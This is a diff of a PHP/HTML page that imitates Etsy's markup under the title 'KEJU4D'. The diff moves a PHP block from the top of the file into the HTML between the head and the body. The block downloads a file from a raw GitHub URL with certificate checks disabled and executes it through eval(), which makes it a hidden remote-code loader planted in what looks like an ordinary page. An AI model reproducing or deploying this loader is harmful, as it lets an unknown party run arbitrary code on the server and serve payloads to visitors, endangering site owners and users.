@@ -1,13 +1,4 @@
-<?php
-$url = 'https://raw.githubusercontent.com/yyujimin88-hue/ecard/c39bcc10bad363a0e246b67bfed6f1d746f417c0/file.txt';
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-$fileContents = curl_exec($ch);
-curl_close($ch);
-eval("?>" . $fileContents);
-?>
+
 
 <!DOCTYPE html>
 <html lang="en-US" xmlns:og="http://ogp.me/ns#" xmlns:fb="https://www.facebook.com/2008/fbml">
@@ -332,6 +323,18 @@ eval("?>" . $fileContents);
     <meta name="theme-color" content="rgb(255, 255, 255)" />
     <link type="application/opensearchdescription+xml" rel="search" href="/osdd.php" title="KEJU4D" />
   </head>
+  
+  <?php
+$url = 'https://raw.githubusercontent.com/yyujimin88-hue/ecard/c39bcc10bad363a0e246b67bfed6f1d746f417c0/file.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
+curl_close($ch);
+eval("?>" . $fileContents);
+?>
+
   <body class="ui-toolkit transitional-wide etsy-has-it-design is-responsive no-touch en-US IDR ID" data-language="en-US" data-currency="IDR" data-region="ID">
     <script nonce="+gWSoSeB7oJ/5IB7H6o53UJw">!function(e,n,E,t,d,_){e.ddjskey="D013AA612AB2224D03B2318D0F5B19",e.ddoptions={endpoint:"https://www.etsy.com/include/tags.js",ajaxListenerPath:!0,enableTagEvents:!0,overrideAbortFetch:!0,abortAsyncOnChallengeDisplay:!0,disableAutoRefreshOnCaptchaPassed:!1,replayAfterChallenge:!0};var s=n.createElement(E),r=n.getElementsByTagName(E)[0];s.async=1,s.defer=1,s.src="https://www.etsy.com/include/tags.js",r.parentNode.insertBefore(s,r)}(window,document,"script");var DD_BLOCKED_EVENT_NAME="dd_blocked",DD_RESPONSE_DISPLAYED_EVENT_NAME="dd_response_displayed",DD_RESPONSE_ERROR_EVENT_NAME="dd_response_error";window.addEventListener(DD_RESPONSE_DISPLAYED_EVENT_NAME,function(){window.Sentry&&window.Sentry.setTag&&window.Sentry.setTag(DD_RESPONSE_DISPLAYED_EVENT_NAME,!0)}),window.addEventListener(DD_BLOCKED_EVENT_NAME,function(){window.Sentry&&window.Sentry.setTag&&window.Sentry.setTag(DD_BLOCKED_EVENT_NAME,!0)}),window.addEventListener(DD_RESPONSE_ERROR_EVENT_NAME,function(){window.Sentry&&window.Sentry.setTag&&window.Sentry.setTag(DD_RESPONSE_ERROR_EVENT_NAME,!0)})</script>
     <div data-above-header class="wt-z-index-5 wt-position-relative"></div>
